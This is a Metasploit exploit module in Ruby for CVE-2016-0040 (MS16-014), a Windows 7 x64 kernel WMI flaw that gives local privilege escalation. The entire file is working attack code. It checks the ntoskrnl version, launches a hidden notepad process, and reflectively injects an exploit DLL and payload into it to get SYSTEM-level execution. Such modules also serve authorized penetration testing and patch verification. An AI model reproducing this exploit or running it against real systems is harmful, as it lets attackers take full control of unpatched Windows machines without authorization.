##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/post/windows/reflective_dll_injection'
class MetasploitModule < Msf::Exploit::Local
  Rank = NormalRanking

  include Msf::Post::File
  include Msf::Post::Windows::Priv
  include Msf::Post::Windows::Process
  include Msf::Post::Windows::FileInfo
  include Msf::Post::Windows::ReflectiveDLLInjection

  def initialize(info = {})
    super(update_info(info,
      'Name'            => 'Windows WMI Recieve Notification Exploit',
      'Description'     => %q(
        This module exploits an uninitialized stack variable in the WMI subsystem of ntoskrnl.
        This module has been tested on vulnerable builds of Windows 7 SP0 x64 and Windows 7 SP1 x64.
      ),
      'License'         => MSF_LICENSE,
      'Author'          => [
        'smmrootkit',      # crash code
        'de7ec7ed',        # exploit code
        'de7ec7ed',        # msf module
      ],
      'Arch'            => [ARCH_X64],
      'Platform'        => 'win',
      'SessionTypes'    => ['meterpreter'],
      'DefaultOptions'  => {
        'EXITFUNC' => 'thread'
      },
      'Targets' => [
        ['Windows 7 SP0/SP1', { 'Arch' => ARCH_X64 }]
      ],
      'Payload' => {
        'Space'       => 4096,
        'DisableNops' => true
      },
      'References' => [
        ['CVE', '2016-0040'],
        ['MSB', 'MS16-014'],
        ['URL', 'https://github.com/de7ec7ed/CVE-2016-0040'],
        ['URL', 'https://github.com/Rootkitsmm/cve-2016-0040'],
        ['URL', 'https://technet.microsoft.com/en-us/library/security/ms16-014.aspx']
      ],
      'DisclosureDate'  => 'Dec 4 2015',
      'DefaultTarget'   => 0)
  )
  end

  def check
    # Windows 7 SP0/SP1 (64-bit)

    if sysinfo['OS'] !~ /windows/i
      return Exploit::CheckCode::Unknown
    end

    file_path = expand_path('%windir%') << '\\system32\\ntoskrnl.exe'
    major, minor, build, revision, branch = file_version(file_path)
    vprint_status("ntoskrnl.exe file version: #{major}.#{minor}.#{build}.#{revision} branch: #{branch}")

    return Exploit::CheckCode::Safe if build > 7601

    return Exploit::CheckCode::Appears
  end

  def exploit
    if is_system?
      fail_with(Failure::None, 'Session is already elevated')
    end

    check_result = check
    if check_result == Exploit::CheckCode::Safe || check_result == Exploit::CheckCode::Unknown
      fail_with(Failure::NotVulnerable, 'Exploit not available on this system.')
    end

    if sysinfo['Architecture'] == ARCH_X64 && session.arch == ARCH_X86
      fail_with(Failure::NoTarget, 'Running against WOW64 is not supported')
    end

    print_status('Launching notepad to host the exploit...')
    notepad_process = client.sys.process.execute('notepad.exe', nil, 'Hidden' => true)
    begin
      process = client.sys.process.open(notepad_process.pid, PROCESS_ALL_ACCESS)
      print_good("Process #{process.pid} launched.")
    rescue Rex::Post::Meterpreter::RequestError
      # Reader Sandbox won't allow to create a new process:
      # stdapi_sys_process_execute: Operation failed: Access is denied.
      print_status('Operation failed. Trying to elevate the current process...')
      process = client.sys.process.open
    end

    print_status("Reflectively injecting the exploit DLL into #{process.pid}...")
    library_path = ::File.join(Msf::Config.data_directory, 'exploits', 'CVE-2016-0040', 'CVE-2016-0040.x64.dll')
    library_path = ::File.expand_path(library_path)

    print_status("Injecting exploit into #{process.pid}...")
    exploit_mem, offset = inject_dll_into_process(process, library_path)

    print_status("Exploit injected. Injecting payload into #{process.pid}...")
    payload_mem = inject_into_process(process, payload.encoded)

    # invoke the exploit, passing in the address of the payload that
    # we want invoked on successful exploitation.
    print_status('Payload injected. Executing exploit...')
    process.thread.create(exploit_mem + offset, payload_mem)

    print_good("Exploit finished, wait for (hopefully privileged) payload execution to complete.")
  end
end
